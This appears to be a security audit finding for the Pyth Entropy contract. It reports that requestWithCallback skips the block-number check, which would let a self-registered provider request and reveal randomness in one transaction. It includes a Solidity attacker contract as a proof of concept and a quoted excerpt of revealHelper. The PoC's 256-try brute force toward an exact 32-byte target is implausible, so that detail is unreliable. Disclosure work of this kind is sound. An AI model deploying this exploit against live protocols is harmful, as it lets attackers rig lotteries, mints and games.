### Title
Malicious Provider Can Request and Reveal Entropy in the Same Transaction, Biasing Random Number Output - (File: `target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

### Summary
`requestWithCallback`/`requestV2` hardcodes `useBlockHash = false`, and `revealHelper` performs no block-number check in that path. A malicious actor who registers as a provider can atomically call `requestWithCallback` and `revealWithCallback` in a single transaction, pre-selecting a `userContribution` that yields a favorable random number — the on-chain equivalent of a flash-loan same-transaction manipulation.

---

### Finding Description

`requestV2` (and its alias `requestWithCallback`) unconditionally passes `useBlockhash = false` to `requestHelper`: [1](#0-0) 

Inside `revealHelper`, the block-number guard is only active when `req.useBlockhash == true`: [2](#0-1) 

When `useBlockhash = false`, `revealHelper` performs **no temporal check whatsoever** — it only validates the cryptographic commitment. This means `revealWithCallback` can be called in the same block (or even the same transaction) as `requestWithCallback`.

`revealWithCallback` is callable by **anyone** (no `msg.sender` restriction): [3](#0-2) 

Provider registration is **permissionless** — any address can call `register`: [4](#0-3) 

Because the provider generates their own hash chain, they know every `x_i` in advance. The random output is `r = hash(userContribution, x_i)`. By iterating over candidate `userContribution` values off-chain, the attacker can find one that produces a favorable `r`, then execute the full request+reveal atomically.

---

### Impact Explanation

Any downstream protocol that allows callers to specify an arbitrary provider address (rather than pinning to the default Fortuna provider) is exposed. The attacker can:

- Win NFT mints, lotteries, or on-chain games that use Pyth Entropy for randomness.
- Manipulate any outcome that depends on the callback value delivered by `entropyCallback`.

The random number delivered to the victim contract's `entropyCallback` is fully attacker-controlled, defeating the security guarantee of the 2-party commit-reveal protocol.

---

### Likelihood Explanation

- Provider registration is permissionless; no privileged access is required.
- The attacker generates their own hash chain, so they know all `x_i` values.
- The attack is atomic (single transaction), so it cannot be front-run or interrupted.
- The only prerequisite is that the victim protocol accepts the attacker's provider address, which is common in protocols that expose a `provider` parameter to users.

---

### Recommendation

Enforce a minimum block gap between request and reveal for the `requestWithCallback`/`requestV2` path. The simplest fix mirrors the existing `useBlockhash` guard: require `block.number > req.blockNumber` before allowing reveal, regardless of the `useBlockhash` flag. Alternatively, document clearly that `requestWithCallback` must only be used with the trusted default provider, and add an on-chain check that rejects requests to non-whitelisted providers.

---

### Proof of Concept

```solidity
// Attacker contract
contract AttackerProvider is IEntropyConsumer {
    IEntropy entropy;
    bytes32[] hashChain; // attacker-generated chain: x[i] = keccak256(x[i+1])
    uint64 chainLength;

    constructor(address _entropy, bytes32[] memory _chain) {
        entropy = IEntropy(_entropy);
        hashChain = _chain;
        chainLength = uint64(_chain.length);
    }

    function attack(bytes32 targetOutcome) external payable {
        // 1. Register as provider (permissionless)
        entropy.register(0, hashChain[0], "", chainLength, "");

        uint64 nextSeq = entropy.getProviderInfo(address(this)).sequenceNumber;
        bytes32 providerContrib = hashChain[nextSeq]; // known in advance

        // 2. Brute-force a userContribution that yields targetOutcome
        bytes32 userContrib;
        for (uint256 i = 0; i < 256; i++) {
            userContrib = bytes32(i);
            bytes32 candidate = entropy.combineRandomValues(userContrib, providerContrib, 0);
            if (candidate == targetOutcome) break;
        }

        // 3. Request + reveal in the SAME transaction — no block-number check fires
        uint64 seq = entropy.requestWithCallback{value: msg.value}(address(this), userContrib);
        entropy.revealWithCallback(address(this), seq, userContrib, providerContrib);
        // entropyCallback is now called with the pre-selected targetOutcome
    }

    function entropyCallback(uint64, address, bytes32 randomNumber) internal override {
        // randomNumber == targetOutcome chosen above
    }

    function getEntropy() internal view override returns (address) { return address(entropy); }
}
```

The attack succeeds because `requestWithCallback` stores `useBlockhash = false` and `revealHelper` skips the `blockhash` guard entirely, allowing the full request-reveal cycle to complete within one transaction. [5](#0-4)

    function revealHelper(
        EntropyStructsV2.Request storage req,
        bytes32 userContribution,
        bytes32 providerContribution
    ) internal returns (bytes32 randomNumber, bytes32 blockHash) {
        bytes32 providerCommitment = constructProviderCommitment(
            req.numHashes,
            providerContribution
        );
        bytes32 userCommitment = constructUserCommitment(userContribution);
        if (
            keccak256(bytes.concat(userCommitment, providerCommitment)) !=
            req.commitment
        ) revert EntropyErrors.IncorrectRevelation();

        blockHash = bytes32(uint256(0));
        if (req.useBlockhash) {
            bytes32 _blockHash = blockhash(req.blockNumber);

            // The `blockhash` function will return zero if the req.blockNumber is equal to the current
            // block number, or if it is not within the 256 most recent blocks. This allows the user to
            // select between two random numbers by executing the reveal function in the same block as the
            // request, or after 256 blocks. This gives each user two chances to get a favorable result on
            // each request.
            // Revert this transaction for when the blockHash is 0;
            if (_blockHash == bytes32(uint256(0)))
                revert EntropyErrors.BlockhashUnavailable();

            blockHash = _blockHash;
        }

        randomNumber = combineRandomValues(
            userContribution,
            providerContribution,
            blockHash
        );

        EntropyStructsV2.ProviderInfo storage providerInfo = _state.providers[
            req.provider
        ];
        if (providerInfo.currentCommitmentSequenceNumber < req.sequenceNumber) {
            providerInfo.currentCommitmentSequenceNumber = req.sequenceNumber;
            providerInfo.currentCommitment = providerContribution;
        }
